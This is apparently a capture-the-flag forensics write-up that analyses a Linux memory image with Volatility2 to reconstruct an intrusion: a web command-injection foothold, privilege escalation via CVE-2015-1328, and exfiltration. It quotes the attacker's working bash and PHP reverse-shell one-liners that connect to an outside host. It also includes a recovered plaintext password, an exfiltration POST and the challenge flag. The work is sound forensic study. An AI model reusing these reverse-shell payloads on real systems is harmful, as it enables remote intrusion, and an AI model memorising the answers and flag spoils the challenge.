# core-problems

### Category: Forensics | Difficulty: Easy | Tenant: UNR

We are given a file.bin and a .zip to use with Volatility2.
The image is a linux one and that is why we must use the right symbols. The .zip file holds them.

In order to use it, we can create a vol2_plugins folder and point to it in order to find the profile like so:

```./volatility_2.6_lin64_standalone --plugins=~/vol2_plugins -f ~/Downloads/file.bin --info | grep Linux```

The profile name is visible amongst them so every command must now be used like this:

```./volatility_2.6_lin64_standalone --plugins=<plugins-folder> -f <file> --profile=<profile-name> [COMMAND]```

### Q1. What is the IP address of the attacker?

Using the ```linux_netstat``` command, we can see 2 established connections to this address:
```
880079f34e00 TCP      192.168.1.136   :   22 192.168.1.194   :50606 ESTABLISHED
880079f35500 TCP      192.168.1.136   :   22 192.168.1.194   :55936 ESTABLISHED
```
### Q2. What model is the CPU of the affected machine?

To find this out, we can use ```linux_cpuinfo```
```
Processor    Vendor           Model
------------ ---------------- -----
0            GenuineIntel     Intel(R) Core(TM) i9-10885H CPU @ 2.40GHz
```
### Q3. What is the MAC address of the affected machine?

Using ```linux_ifconfig``` gives us the IPv4 and MAC addresses of the machine:
```
Interface        IP Address           MAC Address        Promiscous Mode
---------------- -------------------- ------------------ ---------------
lo               127.0.0.1            00:00:00:00:00:00  False
eth0             192.168.1.136        08:00:27:cc:dd:e0  True
```
### Q4. What is the MAC address of the attacker machine?

```linux_arp``` gives the ARP cache. Considering the addresses were on the same network, we found the right binding:
```
[192.168.1.194                             ] at 38:14:28:0b:12:de    on eth0
```
### Q5. What is the PID of the application used by the attacker for his interactive shell?

We can use ```linux_pslist``` to list the processes and their PIDs and PPIDs. Considering the connection was on port 22, I looked for sshd processes.
```
0xffff8800799d47d0 sshd                 4503            4455            1000            1000   0x0000000079024000 2021-11-24 12:54:56 UTC+0000
```
### Q6. What was the initial payload used by the attacker to create a reverse shell (URL decoded)?

Using ```linux_enumerate_files``` and ```linux_find_file``` (-F and -i switches for finding and dumping), looking through /var/log/apache2/access.log, the commands run trough the code parameter can be seen:
```
192.168.1.194 - - [24/Nov/2021:13:22:05 +0100] "GET /index.php?code=bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.1.194%2F12035%200%3E%261 HTTP/1.1" 200 269 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.164 Safari/537.36"
192.168.1.194 - - [24/Nov/2021:13:22:12 +0100] "GET /index.php?code=php%20-r%20%27%24sock%3Dfsockopen%28%22192.168.1.194%22%2C12035%29%3Bexec%28%22%2Fbin%2Fsh%20-i%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27 HTTP/1.1" 200 366 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.164 Safari/537.36"
```
From URL Decode:
```
bash -i >& /dev/tcp/192.168.1.194/12035 0>&1
php -r '$sock=fsockopen("192.168.1.194",12035);exec("/bin/sh -i <&3 >&3 2>&3");'
```
The second command was successful, the first one was not.

### Q7. What other payload did the attacker try, but was unsuccessful?

See Q6 for the answer.

### Q8. What is the password of the unprivileged account?

In /var/auth.log, I saw a reference to PWD=/run/shm, so I checked that folder and found some interesting scripts and files:                                                                

```
0xffff88007b2dfa98                      7267 /run/shm
0xffff880079c722f8                     63293 /run/shm/cve
0xffff88007b2de838                     63289 /run/shm/cve.c
0xffff880079e6c058                     63274 /run/shm/passwd.bak
0xffff880079ba1018                     38607 /run/shm/linpeas2.out
0xffff880079ba1558                      9597 /run/shm/linpeas.out
0xffff880079ba0ad8                      9596 /run/shm/linpeas.sh
0xffff88007b2df7f8                      7265 /run/shm
```

```linux_bash``` also gave some indicators to these files.

Checking password.bak, I found the password:

```
carl:Thisiscarlsecurepassword:1000:1000:carl,,,:/home/carl:/bin/bash
```

### Q9. What is the CVE-ID of the exploit used to gain root access?

Checking the cve.c file gave me the downloaded exploit, so I used google dorks to find it: CVE-2015-1328
Can also be seen in linpeas output (overlayfs).

### Q10. Provide the link of the exploit from exploit-db.com.

https://www.exploit-db.com/exploits/37292

### Q11. What program/script did the attacker download on the server for the initial recon?

Q8 has the answer.

### Q12. The attacker might have set a recording mechanism on the network. Find out where is this recodring stored (absolute path).

The /home/carl/capture.pcap was the recording mechanism (see last question, I did that one first).

### Q13. What PID does this recording mechanism have?

It can be seen in Q19.

### Q14. What port was used on the attacker's local machine for the reverse shell?

See Q6 for the answer.

### Q15. What is the address of the exploit used by the attacker?

While looking through /run/smh again, I figured out that linpeas.out was run as www-data, before logging into carl with the password (found from linpeas ouput), while the linpeas2.out was run as carl, looking for a way to escalate. Therefore there are differences in output (ran diff on them).

-will solve in the future-

### Q16. What is the PID of the root shell?

From the following output, we can see the PID changing considerably:
```
18894  0      0      sshd: carl [priv]                                               
18942  1000   1000   sshd: carl@pts/0                                                
18943  1000   1000   -bash                                                           
4414   0      0      sh -i 
```

Plus, 18943 is PPID for it and tcpdump was being run as root already. And 18943 ran from "/run/shm", but 4414 ran from "/root" as per ```linux_getcwd``` output.

```
0xffff880036c85fc0 sh                   4414            18943           0               0      0x000000007908b000 2021-11-24 12:32:10 UTC+0000
0xffff88007905dfc0 tcpdump              4539            4414            0               0      0x0000000079202000 2021-11-24 13:02:39 UTC+0000
```

### Q17. What is the full time of the moment when the attacker established the first connection with the reverse shell?

See Q6 for that answer.

### Q18. What is the full time of the moment when the attacker elevated his privileges to root?

-still trying harder-

### Q19. The attacker exfiltrated some information from the root user. What is this information about? Format: CTF{sha256}.

Using ```linux_psaux``` I found a certain command that seemed interesting to delve into:
```
4539   0      0      tcpdump -i eth0 -w /home/carl/capture.pcap
```
So I proceeded to find and dump that file, using ```linux_find_file``` with the -F switch and then the -i switch when I got the inode number of it, plus -O for output file.
Looking through the capture, a certain POST request stood out:
```
OST /exfil HTTP/1.1
User-Agent: curl/7.35.0
Host: 192.168.1.194:9000
Accept: */*
Content-Type: text/xml
Content-Length: 70

CTF{3041f1ad38fbb821aea811dff4190ed5527aeec0ed385789219dcdcf7de81d4f}
```
It can also be found in /root/root.txt using ```linux_enumerate_files``` and then dumping it.
